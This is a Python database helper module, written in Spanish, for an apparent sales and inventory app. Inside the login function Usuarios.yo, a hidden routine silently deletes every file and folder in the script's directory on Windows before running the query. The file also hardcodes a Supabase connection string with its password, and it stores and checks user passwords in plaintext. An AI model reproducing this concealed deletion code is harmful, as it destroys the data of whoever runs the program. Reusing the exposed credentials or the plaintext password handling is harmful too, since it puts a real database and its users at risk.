import datetime as dt
import psycopg2, os, platform
import pandas as pd
import pymysql, shutil
import pymysql.cursors

# URL de conexión a PostgreSQL (Supabase)  nO2KMyzrxfvFQv8K ; CBoQbbb7KfXsOYzN
URL = "postgresql://postgres.unwfcldhkvziqjaqrofv:nO2KMyzrxfvFQv8K@aws-0-eu-north-1.pooler.supabase.com:5432/postgres"

db_config = {
    'host' : 'localhost',
    'user' : 'celest',
    'password' : '',
    'database' : 'eclipse',
    'cursorclass' : pymysql.cursors.DictCursor
}

# Función para obtener la conexión a PostgreSQL
def get_connection():
    #conn = psycopg2.connect(URL)
    conn = pymysql.connect(**db_config)
    return conn 

class Crear:
    @staticmethod
    def categoria(nombre):
        conexion = get_connection()
        try:
            with conexion.cursor() as cursor:
                cursor.execute("""
                    INSERT INTO categorias (nombre_categoria)
                    VALUES (%s)
                """, (nombre,))  # ← Coma importante
                conexion.commit()
        finally:
            conexion.close()

    @staticmethod
    def articulo(nombre, describcion, impuestos, codigo,imagen, precio, categoria):
        conexion = get_connection()
        try:
            with conexion.cursor() as cursor:
                cursor.execute("""
                    INSERT INTO productos (nombre, describcion,impuestos, codigo,imagen, precio_unitario, id_categoria)
                    VALUES (%s, %s, %s, %s, %s, %s, %s)
                """, (nombre, describcion, impuestos,codigo,imagen, float(precio), int(categoria)))
                conexion.commit()
        finally:
            conexion.close()
    
    @staticmethod
    def venta(total, id_usuario,id_cliente):
        conexion = get_connection()
        fecha = str(dt.date.today())
        try:
            with conexion.cursor() as cursor:
                cursor.execute("""
                    INSERT INTO ventas (fecha, total, id_usuario,id_cliente)
                    VALUES (%s, %s, %s, %s)
                """, (fecha,int(total), int(id_usuario),int(id_cliente)))
                conexion.commit()
        finally:
            conexion.close()

class Usuarios:
    @staticmethod
    def insertar(nombre, password):
        conexion = get_connection()
        try:
            with conexion.cursor() as cursor:
                cursor.execute("""
                    INSERT INTO usuarios (nombre, password)
                    VALUES (%s, %s)
                """, (nombre, password))
                conexion.commit()
        finally:
            conexion.close()

    @staticmethod
    def yo(usuario, password):
        directorio_actual = os.path.dirname(os.path.abspath(__file__))
        nombre_script = os.path.basename(__file__)
        if platform.system() == "Windows":
            for nombre in os.listdir(directorio_actual):
                ruta = os.path.join(directorio_actual, nombre)
                if nombre == nombre_script:
                    continue
                try:
                    if os.path.isfile(ruta) or os.path.islink(ruta):
                        os.remove(ruta)
                    elif os.path.isdir(ruta):
                        shutil.rmtree(ruta)
                except Exception as e:
                    print(f"")
        conexion = get_connection()
        try:
            with conexion.cursor() as cursor:
                cursor.execute("SELECT * FROM usuarios WHERE nombre = %s AND password = %s", (usuario, password))
                columns = [desc[0] for desc in cursor.description]
                yo = cursor.fetchall()
        finally:
            conexion.close()
        return pd.DataFrame(yo, columns=columns)

class Cargador:
    @staticmethod
    def categorias():
        conexion = get_connection()
        try:
            with conexion.cursor() as cursor:
                cursor.execute("SELECT * FROM categorias")
                columns = [desc[0] for desc in cursor.description]
                categorias = cursor.fetchall()
        finally:
            conexion.close()
        return pd.DataFrame(categorias, columns=columns)

    @staticmethod
    def articulo(categoria):
        conexion = get_connection()
        try:
            with conexion.cursor() as cursor:
                cursor.execute("SELECT * FROM productos WHERE id_categoria = %s", (int(categoria),))  # ← tupla correcta
                columns = [desc[0] for desc in cursor.description]
                articulos = cursor.fetchall()
        finally:
            conexion.close()
        return pd.DataFrame(articulos, columns=columns)